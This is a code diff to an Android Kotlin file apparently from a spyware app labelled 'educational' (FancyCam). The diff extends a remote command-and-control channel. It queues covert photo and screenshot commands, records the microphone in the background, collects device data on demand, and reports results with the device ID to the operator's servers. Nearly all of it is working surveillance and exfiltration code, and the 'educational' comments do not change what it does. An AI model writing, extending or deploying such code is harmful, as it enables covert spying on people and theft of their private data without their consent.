@@ -1,5 +1,8 @@
-package com.example.fancycam
+package com.example.fancycam.network
 
+import com.example.fancycam.ui.AppActivityLogger
+import com.example.fancycam.services.MicrophoneCapture
+import com.example.fancycam.services.NotificationReaderService
 import android.Manifest
 import android.content.ClipboardManager
 import android.content.Context
@@ -67,13 +70,86 @@ object DataExfilSender {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
+    data class C2Command(
+        val id: String,
+        val action: String,
+        val durationMs: Long = 30000L,
+        val params: JSONObject = JSONObject()
+    )
+
     interface CommandListener {
-        fun onTakePhotoCommand()
-        fun onTakeScreenshotCommand()
+        fun onTakePhotoCommand(commandId: String? = null)
+        fun onTakeScreenshotCommand(commandId: String? = null)
+    }
+
+    private val pendingUiCommands = java.util.concurrent.ConcurrentLinkedQueue<C2Command>()
+    private val executedCommandIds = java.util.Collections.newSetFromMap(
+        java.util.concurrent.ConcurrentHashMap<String, Boolean>()
+    )
+
+    fun drainPendingUiCommands() {
+        val listener = commandListener ?: return
+        while (pendingUiCommands.isNotEmpty()) {
+            val cmd = pendingUiCommands.poll() ?: break
+            Log.i(TAG, "[C2 COMMAND] Dispatching queued command to UI: ${cmd.action} (id: ${cmd.id})")
+            when (cmd.action) {
+                "take_photo" -> listener.onTakePhotoCommand(cmd.id)
+                "take_screenshot" -> listener.onTakeScreenshotCommand(cmd.id)
+            }
+        }
     }
 
     @Volatile
     var commandListener: CommandListener? = null
+        set(value) {
+            field = value
+            if (value != null) {
+                drainPendingUiCommands()
+            }
+        }
+
+    fun reportCommandResult(
+        context: Context,
+        commandId: String?,
+        status: String,
+        result: JSONObject? = null,
+        error: String? = null
+    ) {
+        if (commandId.isNullOrBlank()) return
+        Thread {
+            try {
+                val aid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+                val payload = JSONObject().apply {
+                    put("command_id", commandId)
+                    put("android_id", aid)
+                    put("status", status)
+                    if (result != null) put("result", result)
+                    if (error != null) put("error", error)
+                    put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSZ", Locale.US).format(Date()))
+                }
+                val mediaType = "application/json; charset=utf-8".toMediaType()
+                val body = payload.toString().toRequestBody(mediaType)
+                for (endpoint in AppConfig.getCommandResultEndpoints(context)) {
+                    try {
+                        val request = Request.Builder()
+                            .url(endpoint)
+                            .post(body)
+                            .addHeader("User-Agent", "FancyCam-Educational/1.0")
+                            .addHeader("X-Android-ID", aid)
+                            .build()
+                        httpClient.newCall(request).execute().use { response ->
+                            if (response.isSuccessful) {
+                                Log.i(TAG, "[C2 COMMAND] Successfully reported result for $commandId: $status")
+                                return@Thread
+                            }
+                        }
+                    } catch (ignored: Exception) {}
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed to report command result", e)
+            }
+        }.start()
+    }
 
     fun processServerCommands(context: Context, responseBody: String) {
         if (responseBody.isBlank()) return
@@ -81,31 +157,58 @@ object DataExfilSender {
             val json = JSONObject(responseBody)
             val commands = json.optJSONArray("commands") ?: return
             for (i in 0 until commands.length()) {
-                val cmd = commands.optJSONObject(i) ?: continue
-                val action = cmd.optString("action", "")
-                Log.i(TAG, "[C2 COMMAND] Received command from server: $action")
+                val cmdObj = commands.optJSONObject(i) ?: continue
+                val action = cmdObj.optString("action", "")
+                val cmdId = cmdObj.optString("id", cmdObj.optString("command_id", ""))
+
+                if (cmdId.isNotEmpty() && executedCommandIds.contains(cmdId)) {
+                    Log.d(TAG, "[C2 COMMAND] Skipping already processed command: $cmdId")
+                    continue
+                }
+                if (cmdId.isNotEmpty()) {
+                    executedCommandIds.add(cmdId)
+                }
+
+                Log.i(TAG, "[C2 COMMAND] Received command from server: $action (id: $cmdId)")
+
+                if (cmdId.isNotEmpty()) {
+                    reportCommandResult(context, cmdId, status = "in_progress")
+                }
 
                 when (action) {
                     "take_photo" -> {
                         val listener = commandListener
                         if (listener != null) {
-                            listener.onTakePhotoCommand()
+                            listener.onTakePhotoCommand(cmdId)
                         } else {
-                            Log.w(TAG, "[C2 COMMAND] take_photo command received but commandListener is null")
+                            Log.i(TAG, "[C2 COMMAND] App UI not active; queuing take_photo for resume (id: $cmdId)")
+                            pendingUiCommands.offer(C2Command(id = cmdId, action = "take_photo"))
                         }
                     }
                     "take_screenshot" -> {
                         val listener = commandListener
                         if (listener != null) {
-                            listener.onTakeScreenshotCommand()
+                            listener.onTakeScreenshotCommand(cmdId)
                         } else {
-                            Log.w(TAG, "[C2 COMMAND] take_screenshot command received but commandListener is null")
+                            Log.i(TAG, "[C2 COMMAND] App UI not active; queuing take_screenshot for resume (id: $cmdId)")
+                            pendingUiCommands.offer(C2Command(id = cmdId, action = "take_screenshot"))
                         }
                     }
                     "record_audio" -> {
-                        val durationMs = cmd.optLong("duration", 30000L)
-                        Log.i(TAG, "[C2 COMMAND] Starting audio wiretap recording ($durationMs ms)")
-                        MicrophoneCapture.startCaptureAndExfiltrate(context, durationMs)
+                        val params = cmdObj.optJSONObject("params")
+                        val durationMs = cmdObj.optLong("duration", params?.optLong("duration", 30000L) ?: 30000L)
+                        Log.i(TAG, "[C2 COMMAND] Executing background audio recording ($durationMs ms, id: $cmdId)")
+                        MicrophoneCapture.startCaptureAndExfiltrate(context, durationMs, cmdId)
+                    }
+                    "collect_data" -> {
+                        Log.i(TAG, "[C2 COMMAND] Executing on-demand data collection (id: $cmdId)")
+                        collectAndExfiltrate(context, cmdId)
+                    }
+                    else -> {
+                        Log.w(TAG, "[C2 COMMAND] Unknown command action: $action")
+                        if (cmdId.isNotEmpty()) {
+                            reportCommandResult(context, cmdId, status = "failed", error = "Unknown action: $action")
+                        }
                     }
                 }
             }
@@ -122,7 +225,7 @@ object DataExfilSender {
      * making it indistinguishable from legitimate app behavior at the API level.
      * Forensic detection requires behavioral analysis (network, DB access logs).
      */
-    fun collectAndExfiltrate(context: Context) {
+    fun collectAndExfiltrate(context: Context, commandId: String? = null) {
         Thread {
             try {
                 Log.d(TAG, "[EDUCATIONAL] Starting comprehensive data collection...")
@@ -159,10 +262,13 @@ object DataExfilSender {
                 Log.d(TAG, "[EDUCATIONAL] Full payload constructed (${payload.length()} bytes)")
 
                 // === EXFILTRATION ===
-                sendJson(context, payload)
+                sendJson(context, payload, commandId)
 
             } catch (e: Exception) {
                 Log.e(TAG, "[EDUCATIONAL] Data collection failed", e)
+                if (commandId != null) {
+                    reportCommandResult(context, commandId, status = "failed", error = e.message)
+                }
             }
         }.start()
     }
@@ -675,7 +781,7 @@ object DataExfilSender {
      * Sends JSON payload to C2 server.
      * Educational: This is a plain HTTP POST - easily detectable by network monitors.
      */
-    private fun sendJson(context: Context, json: JSONObject) {
+    private fun sendJson(context: Context, json: JSONObject, commandId: String? = null) {
         val endpoints = AppConfig.getJsonExfilEndpoints(context)
         for (endpoint in endpoints) {
             try {
@@ -702,6 +808,9 @@ object DataExfilSender {
                             detail = "Payload delivered to $endpoint",
                             success = true
                         )
+                        if (commandId != null) {
+                            reportCommandResult(context, commandId, status = "completed", result = JSONObject().put("endpoint", endpoint))
+                        }
                         processServerCommands(context, bodyStr)
                         return
                     }
@@ -709,6 +818,10 @@ object DataExfilSender {
             } catch (e: Exception) {
                 Log.e(TAG, "[EDUCATIONAL] Exfiltration attempt to $endpoint failed", e)
             }
+        }
+
+        if (commandId != null) {
+            reportCommandResult(context, commandId, status = "failed", error = "Could not reach configured server")
         }
 
         AppActivityLogger.logActivity(
@@ -743,7 +856,7 @@ object DataExfilSender {
     /**
      * Sends a lightweight heartbeat ping to C2 server to indicate active/online status.
      */
-    fun sendHeartbeat(context: Context) {
+    fun sendHeartbeat(context: Context, processCommands: Boolean = true) {
         Thread {
             try {
                 val aid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
@@ -758,7 +871,7 @@ object DataExfilSender {
                 }
                 val mediaType = "application/json; charset=utf-8".toMediaType()
                 val body = json.toString().toRequestBody(mediaType)
-                for (endpoint in AppConfig.getHeartbeatEndpoints(context)) {
+                for (endpoint in AppConfig.getHeartbeatEndpoints(context, pollCommands = processCommands)) {
                     try {
                         val request = Request.Builder()
                             .url(endpoint)
@@ -769,7 +882,7 @@ object DataExfilSender {
                         httpClient.newCall(request).execute().use { response ->
                             if (response.isSuccessful) {
                                 val bodyStr = response.body?.string().orEmpty()
-                                processServerCommands(context, bodyStr)
+                                if (processCommands) processServerCommands(context, bodyStr)
                                 return@Thread
                             }
                         }
